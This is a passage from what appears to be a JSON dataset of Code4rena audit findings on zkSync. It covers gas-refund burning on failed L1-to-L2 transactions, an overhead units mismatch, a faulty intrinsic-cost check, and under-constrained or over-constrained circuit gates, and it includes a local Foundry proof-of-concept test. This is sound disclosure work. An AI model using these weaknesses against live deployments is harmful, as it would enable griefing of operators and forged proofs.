If the success is zero, we will revert in order\n\t// to revert the minting of ether to the user\n\tif iszero(success) {\n\t\tnearCallPanic()\n\t}\n```\n\n[bootloader:L1665-L1670](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1665-L1670)\n\nCheck [zkSync specific opcodes: Generally accessible](https://github.com/code-423n4/2023-10-zksync/blob/main/docs/Smart%20contract%20Section/System%20contracts%20bootloader%20description.md#generally-accessible),\n\n> `near_call`. It is basically a “framed” jump to some location of the code of your contract. The difference between the `near_call` and ordinary jump are:\n> \n> - It is possible to provide an `ergsLimit` for it. Note, that unlike `“far_call”s` (i.e. calls between contracts) the 63/64 rule does not apply to them.\n> - If the near call frame panics, all state changes made by it are reversed. Please note, that the memory changes will not be reverted.\n\nPlease note that the only way to revert only the `near_call` frame (and not the parent) is to trigger out of gas error or invalid opcode.\n\nCheck [Simulations via our compiler: Simulating `near_call` (in Yul only)](https://github.com/code-423n4/2023-10-zksync/blob/main/docs/Smart%20contract%20Section/System%20contracts%20bootloader%20description.md#simulations-via-our-compiler)\n\n> Important note: the compiler behaves in a way that if there is a revert in the bootloader, the `ZKSYNC_CATCH_NEAR_CALL` is not called and the parent frame is reverted as well. The only way to revert only the `near_call` frame is to trigger VM’s panic (it can be triggered with either invalid opcode or out of gas error).\n\nIn  `ZKSYNC_NEAR_CALL_executeL1Tx`,  `nearCallPanic()` is called in case of TX failure. If we check `nearCallPanic()` function, we find that it exhausts all the gas of the current frame so that out of gas error is triggered.\n\n```solidity\n\t/// @dev Used to panic from the nearCall without reverting the parent frame.\n\t/// If you use `revert(...)`, the error will bubble up from the near call and\n\t/// make the bootloader to revert as well. This method allows to exit the nearCall only.\n\tfunction nearCallPanic() {\n\t\t// Here we exhaust all the gas of the current frame.\n\t\t// This will cause the execution to panic.\n\t\t// Note, that it will cause only the inner call to panic.\n\t\tprecompileCall(gas())\n\t}\n```\n\n[bootloader:L1678-L1686](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1678-L1686)\n\nBecause of this, no matter how much gas was spent on the TX itself, if it fails, all the unused remaining gas will be burned.\n\nAccording to the docs [zkSync: Batch overhead & limited resources of the batch](https://github.com/code-423n4/2023-10-zksync/blob/main/docs/Smart%20contract%20Section/zkSync%20fee%20model.md#batch-overhead--limited-resources-of-the-batch) the refund should be provided at the end of the transaction.\n\n> Note, that before the transaction is executed, the system can not know how many of the limited system resources the transaction will actually take, so we need to charge for the worst case and provide the refund at the end of the transaction\n\n**On the surface, this might not look like a critical issue since the lost funds are relatively small. However, this may be true for normal or small transactions unlike computationally intensive tasks which may require big upfront payment. The lost funds will be not negligible.**\n\nPlease refer to [How baseFee works on zkSync](https://github.com/code-423n4/2023-10-zksync/blob/main/docs/Smart%20contract%20Section/zkSync%20fee%20model.md#how-basefee-works-on-zksync)\n\n> This does not actually matter a lot for normal transactions, since most of the costs will still go on pubdata for them. However, it may matter for computationally intensive tasks, meaning that for them a big upfront payment will be required, with the refund at the end of the transaction for all the overspent gas.\n\nPlease note that while there is `MAX_TRANSACTION_GAS_LIMIT` for the `gasLimit`, it may go way beyond the `MAX_TRANSACTION_GAS_LIMIT` (since the contracts can be 10s of kilobytes in size). This is called Trusted gas limit which is provided by the operator.\n\nPlease check [Trusted gas limit](https://github.com/code-423n4/2023-10-zksync/blob/main/docs/Smart%20contract%20Section/zkSync%20fee%20model.md#trusted-gas-limit)\n\n> the operator may provide the trusted gas limit, i.e. the limit which exceeds `MAX_TRANSACTION_GAS_LIMIT` assuming that the operator knows what he is doing (e.g. he is sure that the excess gas will be spent on the pubdata).\n\nFrom this, we conclude that the upper limit for the loss is the cost of the `gaslimit` provided by the user which could possibly be a big amount of payment to cover complex tasks (assuming the operator provided a trusted gas limit bigger or equal to `gaslimit` provided by the user).\n\nIt's worth mentioning, that this breaks the trust assumptions that the users have, since the users assume that they will always get a refund if it wasn't consumed by their requested TX.\n\nFor the reasons explained above, I've set the severity to high.\n\n### Proof of Concept\n\nWe have one test file. This file demonstrates two cases:\n1. `test_actual_gas_spent_on_success()` - When the TX succeed, the potential refund holds the actual remaining gas to be refunded.\n2. `test_no_gas_refund_on_failure` - When the TX fails, the potential refund is zero.\n\nImportant notes:\n- While the test is not executed via zkEVM, the only specific opcode for this PoC is, the near call panic. For this reason, it is simulated.\n- The code is written in solidity for simplicity. However, for this PoC, it is good enough to demonstrate and prove the issue.\n\nTo run the test file:\n```sh\nforge test --via-ir -vv\n```\n\nYou should get the following output:\n\n```sh\n[PASS] test_actual_gas_spent_on_success() (gas: 47121)\nLogs:\n  Nearcall callAbi: 100000000\n  gasSpentOnExecution: 31533\n  success:  true\n  potentialRefund: 99968467\n\n[PASS] test_no_gas_refund_on_failure() (gas: 101606767)\nLogs:\n  Nearcall callAbi: 100000000\n  gasSpentOnExecution: 101591221\n  success:  false\n  potentialRefund: 0\n\nTest result: ok. 2 passed; 0 failed; finished in 604.85ms\n```\n\n### Test File\n\n<details> \n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n// PoC => No refund for gas on `L1->L2` tx failure, it always burns the gas even if not used\n\nimport {Test} from \"forge-std/Test.sol\";\nimport \"forge-std/console.sol\";\n\nimport {DSTest} from \"ds-test/test.sol\";\n\nuint256 constant OVERHEAD_TX = 100_000; // assume overhead as 100000\nuint256 constant GAS_PREP = 2000; // assume preparation value\n\ncontract ExternalContract {\n    uint256 varState;\n\n    function doSomething(uint256 num) external {\n        varState = 1;\n\n        //  revert if num is zero to cause nearCallPanic later\n        if (num == 0) {\n            revert(\"something wrong happened\");\n        }\n    }\n}\n\ninterface IExternalContract {\n    function doSomething(uint256 num) external;\n}\n\ninterface IBooloaderMock {\n    function ZKSYNC_NEAR_CALL_SIMULATION_executeL1Tx(\n        uint256 callAbi,\n        bytes memory txCalldataEncoded\n    ) external;\n}\n\ncontract BooloaderMock {\n    ExternalContract externalContract;\n\n    constructor() {\n        externalContract = new ExternalContract();\n    }\n\n    /// @dev The overhead in gas that will be used when checking whether the context has enough gas, i.e.\n    /// when checking for X gas, the context should have at least X+CHECK_ENOUGH_GAS_OVERHEAD() gas.\n    function CHECK_ENOUGH_GAS_OVERHEAD() internal pure returns (uint256 ret) {\n        ret = 1000000;\n    }\n\n    function checkEnoughGas(uint256 gasToProvide) internal view {\n        // Using margin of CHECK_ENOUGH_GAS_OVERHEAD gas to make sure that the operation will indeed\n        // have enough gas\n        // CHECK_ENOUGH_GAS_OVERHEAD => 1_000_000\n        if (gasleft() < (gasToProvide + CHECK_ENOUGH_GAS_OVERHEAD())) {\n            revert(\"No enough gas\");\n        }\n    }\n\n    function notifyExecutionResult(bool success) internal {}\n\n    function nearCallPanic() internal pure {\n        // Here we exhaust all the gas of the current frame.\n        // This will cause the execution to panic.\n        // Note, that it will cause only the inner call to panic.\n        uint256 x = 0;\n        while (true) {\n            x += 1;\n        }\n    }\n\n    // simulation of near call\n    function ZKSYNC_NEAR_CALL_SIMULATION_executeL1Tx(\n        uint256 callAbi,\n        bytes memory txCalldataEncoded\n    ) public {\n        (bool success, ) = address(externalContract).call{gas: callAbi}(\n            txCalldataEncoded\n        );\n\n        if (!success) {\n            // nearCall panic\n            nearCallPanic();\n        }\n    }\n\n    function getExecuteL1TxAndGetRefund(\n        uint256 gasForExecution,\n        bytes memory txCalldataExternalContract\n    ) internal returns (uint256 potentialRefund, bool success) {\n        uint256 callAbi = gasForExecution;\n\n        checkEnoughGas(gasForExecution);\n\n        uint256 gasBeforeExecution = gasleft();\n\n        bytes memory txCalldataEncoded = abi.encodeCall(\n            IBooloaderMock.ZKSYNC_NEAR_CALL_SIMULATION_executeL1Tx,\n            (callAbi, txCalldataExternalContract)\n        );\n\n        console.log(\"Nearcall callAbi: %d\", callAbi);\n        // pass 64/63 to simulate nearCall that doesn't follow this 63/64 rule\n        uint256 fullGas = (callAbi * 64) / 63;\n        (success, ) = address(this).call{gas: fullGas}(txCalldataEncoded);\n\n        notifyExecutionResult(success);\n        uint256 gasSpentOnExecution = gasBeforeExecution - gasleft();\n        console.log(\"gasSpentOnExecution: %d\", gasSpentOnExecution);\n        if (gasSpentOnExecution <= gasForExecution) {\n            potentialRefund = gasForExecution - gasSpentOnExecution;\n        }\n    }\n\n    function processL1Tx(\n        uint256 l2ValueProvidedByUser,\n        uint256 gasLimitProvidedByUser,\n        bytes memory txCalldataExternalContract\n    ) external payable returns (uint256 potentialRefund, bool success) {\n        uint256 overheadTX = OVERHEAD_TX; // assume overhead for simplicity\n        uint256 gasLimitForTx = gasLimitProvidedByUser - overheadTX;\n        uint256 gasUsedOnPreparation = GAS_PREP; // assume preparation value simplicity\n        uint256 gasLimit = gasLimitProvidedByUser;\n\n        uint256 gasPrice = 13e9;\n        uint256 txInternalCost = gasPrice * gasLimit;\n        require(\n            msg.value >= l2ValueProvidedByUser + txInternalCost,\n            \"deposited eth too low\"\n        );\n        require(gasLimitForTx > gasUsedOnPreparation, \"Tx didn't continue\");\n\n        (potentialRefund, success) = getExecuteL1TxAndGetRefund(\n            (gasLimitForTx - gasUsedOnPreparation),\n            txCalldataExternalContract\n        );\n    }\n}\n\ncontract BootloaderMockTest is DSTest, Test {\n    BooloaderMock bootloaderMock;\n\n    function setUp() public {\n        bootloaderMock = new BooloaderMock();\n        vm.deal(address(this),100 ether);\n    }\n\n    function test_no_gas_refund_on_failure() public {\n        uint256 gasLimitByUser = 100_000_000 + OVERHEAD_TX + GAS_PREP;\n        uint256 l2Value = 0;\n        bytes memory txCalldataExternalContract = abi.encodeCall(\n            IExternalContract.doSomething,\n            (0) // value 0 cause the call to fail\n        );\n        (uint256 potentialRefund, bool success) = bootloaderMock.processL1Tx{\n            value: 10 ether\n        }(l2Value, gasLimitByUser, txCalldataExternalContract);\n        console.log(\"success: \", success);\n        console.log(\"potentialRefund: %d\", potentialRefund);\n    }\n\n    function test_actual_gas_spent_on_success() public {\n        uint256 gasLimitByUser = 100_000_000 + OVERHEAD_TX + GAS_PREP;\n        uint256 l2Value = 0;\n        bytes memory txCalldataExternalContract = abi.encodeCall(\n            IExternalContract.doSomething,\n            (1) // value 1 makes the call successful\n        );\n        (uint256 potentialRefund, bool success) = bootloaderMock.processL1Tx{\n            value: 10 ether\n        }(l2Value, gasLimitByUser, txCalldataExternalContract);\n        console.log(\"success: \", success);\n        console.log(\"potentialRefund: %d\", potentialRefund);\n    }\n}\n```\n\n</details>\n\n### Recommended Mitigation Steps\n\nOne suggestion is to use invalid opcode instead of burning gas.\n\n**[miladpiri (zkSync) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/979#issuecomment-1794734112):**\n > It is Low. The user does indeed lose all the gas if success is false, as we invoke the `nearCallPanic` that burns all the gas in the near call (which is basically all the execution gas).\n\n**[Alex the Entreprenerd (judge) decreased severity to QA and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/979#issuecomment-1826777382):**\n > I believe the design decision makes sense, a ``L1->L2`` must consume all gas as otherwise computing the refunds would be ripe for exploitation.\n\n**[koolexcrypto (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/979#issuecomment-1837508334):**\n > \n> @Alex the Entreprenerd - I kindly ask you to re-evaluate the issue above considering the following:\n> \n> **EVM non-equivalence** \n>\n>  If you check the [differences from Ethereum at zkSync docs](https://era.zksync.io/docs/reference/architecture/differences-with-ethereum.html), EVM REVERT instruction is not listed. Meaning that, REVERT behaviour in zkSync Era VM should behave exactly the same as in EVM. Here is a simple summary of how the [EIP-140](https://eips.ethereum.org/EIPS/eip-140) defines the REVERT instruction: \n>  > The REVERT instruction provides a way to stop execution and revert state changes, without consuming all provided gas and with the ability to return a reason.\n> \n> The REVERT instruction behaviour is also confirmed in the [ZkSync Era Virtual Machine primer document](https://github.com/code-423n4/2023-10-zksync/blob/main/docs/VM%20Section/ZkSync%20Era%20Virtual%20Machine%20primer.md#return-revert-panic) which says:\n> > Revert: a recoverable error happened. Unspent gas is returned to the caller, which will execute the exception handler. The instruction is revert.\n> \n> However, it is not the case as demonstrated in the issue above. This is due to the fact that when a TX (requested from L1) fails due to a REVERT opcode in the contract code of the callee, all the remaining gas (from the actual execution gas) will be always consumed. This behaviour is similar to the deprecated/removed opcode `throw` from EVM.\n> \n> **EVM Behaviour Discrepancy**\n>\n> Assume we have:\n> - **User X** - who is the caller.\n> - **Contract C** - on L2 which is the callee and has **Function F**.\n> - **Function F** - which consists of 1000 lines of code. However at line 4, there is a revert.\n> \n> Let's check two scenarios:\n> \n> 1. **User X** calls **Function F** by sending an L2 TX directly, at line 4, the execution finishes due to the revert and all unspent gas is returned to the caller.\n> 2. **User X** calls the same function **Function F** by sending an L2 TX indirectly (i.e. requested from L1), at line 4, the execution stops due to the revert and all unspent gas is consumed anyway.\n> \n> In the first scenario, REVERT behaves exactly as expected.\n> In the second scenario, REVERT behaves as if it was the deprecated/removed opcode `throw`. *Please note that we are talking here about the actual execution gas.*\n>\n> From this, we can see how the Bootloader breaks the zkSync Era VM  consistency\n> \n> **zkSync Era's fee model**\n> \n> Some distinctive feature of zkSync Era's fee model is the abundance of refunds for **unused limited system resources** and **overpaid computation**. Please check [High-level: conclusion](https://github.com/code-423n4/2023-10-zksync/blob/main/docs/Smart%20contract%20Section/zkSync%20fee%20model.md#high-level-conclusion) which says:\n> > The other distinctive feature of the fee model used on zkSync is the abundance of refunds, i.e.:\n> > - For unused limited system resources.\n> > - For overpaid computation.\n> \n> Also, In the [Fee mechanism](https://era.zksync.io/docs/reference/concepts/fee-model.html) docs which says:\n> > zkSync Era's fee model is similar to Ethereum’s where gas is charged for computational cost, cost of publishing data on-chain and storage effects.\n> \n> The above issue shows how the implementation is not aligned with this design since it charges for opcodes that were never executed (i.e. opcodes that happen to be after a REVERT). Therefore, no resources have been used for it.\n> \n> In the light of this basis, the unspent gas should be returned to the user especially when the user can not influence the relevant logic in the bootloader by any mean. In other words, we have 4 actors:\n> 1. Caller\n> 2. Callee\n> 3. Operator\n> 4. zkSync Era VM\n> \n> When the caller sends an L2 TX (from L1), It seems that the caller can not provide any input that could prevent the issue from occuring.\n> \n> Lastly, it breaks the trust assumption that the users (or protocols) have, since they assume that they will receive back their unspent gas from the actual execution gas since it wasn't consumed by the TX.\n\n**[Alex the Entreprenerd (judge) increased severity to Medium and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/979#issuecomment-1849046921):**\n > I went back and forth on this finding a bit because:\n> - It's impossible to determine what a reverted transaction should have cost.\n> - Meaning that it's impossible for zkSync to calculate the refund based on the fair value of the expected tx cost.\n> - However, it is fair to expect that just like a normal revert, the cost paid would be capped at the gas spent and not at the gas set as limit.\n> \n> Due to this, the finding can be interpreted as saying that:\n> ``L1->L2`` txs that revert will consume all gas. With this being inconsistent for the EVM, and potentially risky for end users, I agree with Medium Severity\n>\n> The gas used is known and a refund could be computed, which is, in my opinion, inconsistent with other behaviours of the system. I understand the Sponsor may elect for a nofix, and that this would be a warning to developers/end-users/integrators.\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue with the zksync platform's `requestL2Transaction` function, which is used to send a transaction from L1 to L2. The bug involves the `_l2TxGasLimit` parameter, which should cover both the transaction overhead and the actual transaction execution. However, there is a validation issue that causes the transaction to consume all gas if it fails, instead of returning the unspent gas to the user. This behavior is inconsistent with the EVM and the platform's fee model, and could potentially be exploited. The severity of this issue has been debated, but it has been classified as a Medium severity bug. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "https://github.com/code-423n4/2023-10-zksync-findings/issues/979",
      "tags": [],
      "finders": [
        "Audittens",
        "rvierdiiev",
        "Koolex"
      ]
    },
    {
      "id": "30281",
      "title": "[M-02] Unit difference between transaction encoding and bootloader memory constant",
      "impact": "MEDIUM",
      "content": "\n### Lines of code\n\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1847><br>\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/libraries/TransactionValidator.sol#L145>\n\n### Impact\n\nThe overhead can be calculated incorrectly for some transactions and the user will get charged 32 times more in those cases than what he ought to be charged.\n\n### Proof of Concept\n\nThe overhead is calculated as the maximum of:\n\n1. Overhead for slot.\n2. Overhead for memory occupation in the bootloader.\n3. Overhead for single instance circuits.\n\n`2.` is calculated like this:\n\n*Note: please see calculation in warden's [original submission](https://github.com/code-423n4/2023-10-zksync-findings/issues/1105).*\n\nIn other words, the overhead for `2.` is proportional to the percentage of bootloader memory that the transaction will use.\n\nThe issue is that in the actual implementation the units used for `EncodingLength` and `BootloaderMemory` are different. `EncodingLength` is denominated in bytes, while `BootloaderMemory` is denominated in words (32 bytes).\n\nLooking at the implementations:\n\n```js\n//TransactionValidator.getOverheadForTransaction\nuint256 overheadForLength = Math.ceilDiv(_encodingLength * batchOverheadGas, BOOTLOADER_TX_ENCODING_SPACE);\n\n//bootloader.getTransactionUpfrontOverhead\nlet overheadForLength := ceilDiv(\n    safeMul(txEncodeLen, totalBatchOverhead, \"ad\"),\n    BOOTLOADER_MEMORY_FOR_TXS()\n)\n```\n\n`_encodingLength`/`txEncodeLen` are a result of `abi.encode(transaction).length` and are hence expressed in bytes. `BOOTLOADER_TX_ENCODING_SPACE/BOOTLOADER_MEMORY_FOR_TXS()` have the value `273132` in the current config. While the specific number may be subject to change, it is relevant that it is not expressed in bytes, but in words (32 bytes each).\n\nThe number `273132` is derived from the current occupation of the word indices  `[250141...523261]` (difference is slightly off with `273120`). Note that this range is derived from my own tracing of the bootloaders memory slots with the current config, so there might be a minor error in either the configuration or my own attempt of enumerating the slots. The [docs](https://github.com/code-423n4/2023-10-zksync/blob/main/docs/Smart%20contract%20Section/System%20contracts%20bootloader%20description.md#the-actual-transactions-descriptions) state that `[252189..523261]` should be the range (difference `271072`). Either way the minor difference is negligible and does not affect the stated impact. Due to the different units used, the denominator in above formula is 32 times smaller than it should be, hence, calculating a 32 times larger overhead\n\n### Recommended Mitigation Steps\n\nMultiply `BOOTLOADER_TX_ENCODING_SPACE` and `BOOTLOADER_MEMORY_FOR_TXS()` by 32 when using them in the calculation. Alternatively, change those values to be in bytes from the get-go, which should be fine as they don't seem to be used anywhere else currently\n\n**[miladpiri (zkSync) confirmed and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/1105#issuecomment-1796418777):**\n > To be precise, the users might indeed get overcharged, though likely not catastrophically for a typical transaction. So, medium severity is fair.\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue with the calculation of overhead for certain transactions in the zkSync system. This can result in users being charged 32 times more than they should be for these transactions. The cause of this issue is due to different units being used for the calculations, with one being in bytes and the other in words. The recommended mitigation steps are to either multiply the units by 32 or change them to be in bytes. The impact of this bug is considered to be medium severity.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "https://github.com/code-423n4/2023-10-zksync-findings/issues/1105",
      "tags": [],
      "finders": [
        "minhtrng"
      ]
    },
    {
      "id": "30280",
      "title": "[M-01] TransactionValidator checks intrinsic costs against wrong value",
      "impact": "MEDIUM",
      "content": "\nAn incorrect check allows an ``L1->L2`` transaction to be sent that does not cover the sum of overhead and intrinsic costs for the operator.\n\n### Proof of Concept\n\nThe `gasLimit` required for a transaction consists of (see [docs](https://github.com/code-423n4/2023-10-zksync/blob/main/docs/Smart%20contract%20Section/zkSync%20fee%20model.md#determining-base_fee)):\n\n`{totalGasLimit} = {overhead + actualGasLimit} = {overhead + (intrinisicCosts + executionCosts)}`\n\nThe function `TransactionValidator.getMinimalPriorityTransactionGasLimit` calculates the intrinsic costs that will be incurred for the processing of a transaction on L2. The calculated value is checked in `TransactionValidator.validateL1ToL2Transaction` like this:\n\n```js\nrequire(\n    getMinimalPriorityTransactionGasLimit(\n        _encoded.length,\n        _transaction.factoryDeps.length,\n        _transaction.gasPerPubdataByteLimit\n    ) <= _transaction.gasLimit, \n    \"up\"\n);\n```\n\nThe issue is that `_transaction.gasLimit` is the total `gasLimit` including the overhead for the operator. The overhead costs are already checked before that in `TransactionValidator.getTransactionBodyGasLimit`\n\n```js\nfunction getTransactionBodyGasLimit(\n    uint256 _totalGasLimit,\n    uint256 _gasPricePerPubdata,\n    uint256 _encodingLength\n) internal pure returns (uint256 txBodyGasLimit) {\n    uint256 overhead = getOverheadForTransaction(_totalGasLimit, _gasPricePerPubdata, _encodingLength);\n\n    require(_totalGasLimit >= overhead, \"my\"); // provided gas limit doesn't cover transaction overhead\n    unchecked {\n        txBodyGasLimit = _totalGasLimit - overhead;\n    }\n}\n```\n\nThe value returned by this function is the `actualGasLimit` (see formula above) that will be available for the processing of the transaction and which should be used to check if the intrinsic costs are covered.\n\nIn the current implementation the `totalGasLimit` is checked twice if it's greater than overhead and intrinsic costs (separately, not the sum). The bootloader does things correctly by subtracting the overhead from the `totalGasLimit` first and then checking if the rest covers the intrinsic costs (also called \"preparation\" costs):\n\n```js\nfunction processL1Tx(...){\n    ...\n    //gasLimitForTx is total - overhead (and some other intrinsic costs)\n    let gasLimitForTx, reservedGas := getGasLimitForTx(...)\n    ...\n    canonicalL1TxHash, gasUsedOnPreparation := l1TxPreparation(txDataOffset)\n    ...\n}   if gt(gasLimitForTx, gasUsedOnPreparation) {\n        ...\n        potentialRefund, success := getExecuteL1TxAndGetRefund(txDataOffset, sub(gasLimitForTx, gasUsedOnPreparation))\n```\n\nThat means users will not be able to execute transactions for cheap. However, since the ``L1->L2`` transaction have to be processed (due to the way the priority queue works), it would be possible to grief the operator by submitting transactions that only cover the following:\n\n`{max(overhead, intrinsicCosts)}`\n\nThose transactions would not have enough gas to be executed on L2, but the overhead and intrinsic costs would still be incurred.\n\n### Recommended Mitigation Steps\n\nIn `TransactionValidator.validateL1ToL2Transaction` change the check like this:\n\n```js\nuint256 l2GasForTxBody = getTransactionBodyGasLimit(...)\n...\nrequire(\n    getMinimalPriorityTransactionGasLimit(\n        _encoded.length,\n        _transaction.factoryDeps.length,\n        _transaction.gasPerPubdataByteLimit\n    ) <= l2GasForTxBody, // <---\n    \"up\"\n);\n```\n\n`l2GasForTxBody` is what remains after subtracting the overhead from the `totalGasLimit`.\n\n**[miladpiri (zkSync) confirmed and commented via duplicate issue #975](https://github.com/code-423n4/2023-10-zksync-findings/issues/975#issuecomment-1794728882):**\n > While the describe is large & complex, it is about wrong validation of transactions have enough gas.\n>\n> Explanation: `getMinimalPriorityTransactionGasLimit` calculates how much gas the priority tx will minimally consume (intrinsic costs + some other costs like hashing it, etc). However, `_transaction.gasLimit` besides those costs also contains the overhead (for batch verification, etc) costs. Basically this means that if `getMinimalPriorityTransactionGasLimit = _transaction.gasLimit`, then the `_transaction.gasLimit`, once it pays for the overhead, may pay little-to-nothing for the processing of this transaction (it will be marked as failed, but the operator will have to bear the costs anyway as he must process, hash L1 transactions etc).\n\n**[Alex the Entreprenerd (judge) commented via duplicate issue #975](https://github.com/code-423n4/2023-10-zksync-findings/issues/975#issuecomment-1830079718):**\n> From the Zksync side, their job is not to ensure that the tx will not run OOG, as that cannot be guaranteed. Their job is to ensure that the \"cost of processing\" is lower than the \"cost paid\".\n> \n> I believe the check meets those requirements, in that, zkSync is defending itself against spam. This however, seems to create scenarios where a normal user could have a tx validated as functioning which would end up reverting on L2.\n\n***\n\n",
      "summary": "\nThe bug report is about an incorrect check in the zkSync smart contract that allows a transaction to be sent without enough gas to cover the costs for the operator. This means that the transaction will fail, but the operator will still incur costs. This can be exploited by submitting transactions that only cover the minimum costs, causing problems for the operator. The recommended solution is to change the check to ensure that there is enough gas to cover the processing costs.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "https://github.com/code-423n4/2023-10-zksync-findings/issues/1108",
      "tags": [],
      "finders": [
        "BARW",
        "Koolex",
        "anon",
        "rvierdiiev",
        "minhtrng"
      ]
    },
    {
      "id": "30279",
      "title": "[H-06] `Mul/div` relation should not be enforced when divisor is zero",
      "impact": "HIGH",
      "content": "\n### Lines of code\n\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/era-zkevm_circuits/src/main_vm/opcodes/mul_div.rs#L286-L292><br>\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/era-zkevm_circuits/src/main_vm/opcodes/mul_div.rs#L358>\n\n### Impact\n\nWhen applying opcode `div`, if dividend is nonzero and divisor is zero, the resulted quotient and remainder are both zero. The enforced `mul/div` relation does not hold. An unprovable transaction will dos the priority queue.\n\n### Proof of Concept\n\n    quotient_is_zero.conditionally_enforce_true(cs, divisor_is_zero);\n    remainder_is_zero.conditionally_enforce_true(cs, divisor_is_zero);\n\nAccording to the EraVM spec, if divisor is zero, quotient and remainder should also be zero.\n\n    let uint256_zero = UInt256::zero(cs);\n\n    let rem_to_enforce = UInt32::parallel_select(\n        cs,\n        should_apply_mul,\n        &uint256_zero.inner,\n        &remainder_unchecked,\n    );\n    let a_to_enforce =\n        UInt32::parallel_select(cs, should_apply_mul, src0_view, &quotient_unchecked);\n    let b_to_enforce = src1_view.clone();\n    let mul_low_to_enforce =\n        UInt32::parallel_select(cs, should_apply_mul, &mul_low_unchecked, &src0_view);\n    let mul_high_to_enforce = UInt32::parallel_select(\n        cs,\n        should_apply_mul,\n        &mul_high_unchecked,\n        &uint256_zero.inner,\n    );\n\n    let mul_relation = MulDivRelation {\n        a: a_to_enforce,\n        b: b_to_enforce,\n        rem: rem_to_enforce,\n        mul_low: mul_low_to_enforce,\n        mul_high: mul_high_to_enforce,\n    };\n\nWhen dividing, the relation we need to enforce is `src0 = q * src1 + rem.` However, if `src0` (dividend) is nonzero and `src1` (divisor) is zero, both `q` and `rem` will be zero. The relation does not hold.\n\n    let apply_any = Boolean::multi_or(cs, &[should_apply_mul, should_apply_div]);\n    ......\n    diffs_accumulator\n        .mul_div_relations\n        .push((apply_any, mul_div_relations));\n\nIn fact, this relation will be enforced as long as we apply `div`, which will make the operation unprovable.\n\n### Recommended Mitigation Steps\n\nDon't enforce `mul/div` relation when divisor is zero.\n\n### Assessed type\n\nContext\n\n**[miladpiri (zkSync) confirmed and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/598#issuecomment-1794528268):**\n > Overconstrained.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/598#issuecomment-1826873108):**\n > The Warden has shown a case in which the `mul/div` relation doesn't require an additional constraint in the case of a zero divisor.\n\n***\n\n",
      "summary": "\nThis bug report discusses a problem with the `mul/div` operation in the EraVM programming language. When dividing numbers, if the divisor is zero, the resulting quotient and remainder are both zero, which does not follow the expected `mul/div` relation. This can lead to unprovable transactions and cause issues with the priority queue. The recommended solution is to not enforce the `mul/div` relation when the divisor is zero. The bug has been confirmed and assessed by the team and a potential mitigation strategy has been proposed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "https://github.com/code-423n4/2023-10-zksync-findings/issues/598",
      "tags": [],
      "finders": [
        "xuwinnie"
      ]
    },
    {
      "id": "30278",
      "title": "[H-05] Reduction gate in binop operation is unsafe",
      "impact": "HIGH",
      "content": "\nThe range check in the binop's reduction gate is insufficient. After decomposing the `composite_result`, `and_result` and `or_result` could be arbitrary integer less than 128 and `xor_result` could overflow. Attacker can forge arbitrary result for opcode `and` and `or`; as for `xor`, an overflowed `UInt8` will stay in the circuit, which can lead to unexpected behavior.\n\n### Proof of Concept\n\nThere are three main steps in function `get_binop_subresults`:\n\n    let mut composite_result = [Variable::placeholder(); 32];\n    for ((a, b), dst) in a.iter().zip(b.iter()).zip(composite_result.iter_mut()) {\n        let [result] = cs.perform_lookup::<2, 1>(table_id, &[a.get_variable(), b.get_variable()]);\n        *dst = result;\n    }\n\nAt first, we perform a lookup to get the composite result for `and`, `or` and `xor`.\n\n    for (src, decomposition) in composite_result.iter().zip(all_results.array_chunks::<3>()) {\n            if cs.gate_is_allowed::<ReductionGate<F, 4>>() {\n                let mut gate = ReductionGate::<F, 4>::empty();\n                gate.params = ReductionGateParams {\n                    reduction_constants: [F::SHIFTS[0], F::SHIFTS[16], F::SHIFTS[32], F::ZERO],\n                };\n                gate.reduction_result = *src;\n                gate.terms = [\n                    decomposition[0],\n                    decomposition[1],\n                    decomposition[2],\n                    zero_var,\n                ];\n\n                gate.add_to_cs(cs);\n            }\n\nThen, we decomposite it into a larger array `all_results`.\n\n    for (((and, or), xor), src) in and_results\n        .iter_mut()\n        .zip(or_results.iter_mut())\n        .zip(xor_results.iter_mut())\n        .zip(all_results.array_chunks::<3>())\n    {\n        *and = src[0];\n        *or = src[1];\n        *xor = src[2];\n    }\n\n    let and_results = and_results.map(|el| unsafe { UInt8::from_variable_unchecked(el) });\n    let or_results = or_results.map(|el| unsafe { UInt8::from_variable_unchecked(el) });\n    let xor_results = xor_results.map(|el| unsafe { UInt8::from_variable_unchecked(el) });\n\nFinally, we get three separate results from `all_results`.\n\nIn 